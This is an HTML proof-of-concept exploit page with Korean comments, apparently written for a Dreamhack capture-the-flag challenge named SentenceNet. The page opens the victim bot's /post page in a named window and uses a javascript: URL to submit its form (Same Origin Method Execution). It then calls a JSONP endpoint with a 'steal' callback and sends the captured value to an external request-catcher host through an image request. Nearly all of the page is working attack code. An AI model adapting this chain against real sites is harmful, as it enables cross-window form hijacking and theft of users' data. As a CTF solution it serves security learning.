<!doctype html>
<meta charset="utf-8">
<title>SentenceNet PoC</title>
<style>body{font:14px system-ui,Segoe UI,Roboto,sans-serif;max-width:860px;margin:40px auto;padding:0 16px}</style>
<h1>SentenceNet – SOME + JSONP PoC</h1>
<ol>
  <li>/post를 내부 봇 창으로 연다 → 입력값(플래그) 프리필</li>
  <li>타겟 창에 <code>javascript:</code> URL을 쏴서 폼 제출(SOME)</li>
  <li>/callback?callback=steal JSONP로 <code>info_value</code>를 우리 오리진에서 받음</li>
</ol>

<script>
const BASE  = 'http://host8.dreamhack.games:11606';         // 예: https://sentencenet.example
const EXFIL = 'https://hkqibla.request.dreamhack.games?d='; 
/** JSONP 콜백 (서버 정규식: [A-Za-z0-9.]+ ) */
function steal(payload){
  const info = payload && payload.info ? String(payload.info) : '';
  new Image().src = EXFIL + encodeURIComponent(info);
}

/** 팝업 차단 대비: window.open 실패 시 앵커 클릭으로 오픈 */
function openNamed(url, name){
  let w = window.open(url, name);
  if (!w) {
    const a = document.createElement('a');
    a.href = url;
    a.target = name;
    a.rel = 'opener';
    document.body.appendChild(a);
    a.click();
  }
}

/** 타겟 창에서 실행될 JS: 첫 번째 폼을 제출 */
const JS_SUBMIT = "javascript:(function(){var f=document.forms&&document.forms[0];if(f){f.submit();}})()";

(async () => {
  const WIN = "sentencenet_victim";

  // 1) /post 열기 (내부 봇은 private IP라 input value에 flag가 사전 주입됨)
  openNamed(BASE + "/post", WIN);

  // 2) 약간 대기 후, 타겟 창 컨텍스트에서 폼을 submit시키는 javascript: URL 투척 (SOME)
  await new Promise(r => setTimeout(r, 1000));
  const a = document.createElement('a');
  a.target = WIN;
  a.href   = JS_SUBMIT;
  document.body.appendChild(a);
  a.click();

  // 3) 서버가 info_value 갱신할 시간 주고 JSONP 호출
  await new Promise(r => setTimeout(r, 1000));
  const s = document.createElement('script');
  s.src = BASE + "/callback?callback=steal&_=" + Date.now();
  document.head.appendChild(s);
})();
</script>

<hr>
<p><strong>디버그 팁</strong>:
  콜백 정의 전송이 먹히는지 테스트하려면 <code>?callback=console.log</code>로 불러서
  브라우저 콘솔에 <code>{info: ...}</code>가 찍히는지 먼저 확인해봐.
  콜백 이름은 <code>[A-Za-z0-9.]+</code>만 허용(밑줄, 괄호, $, 하이픈 전부 금지).</p>
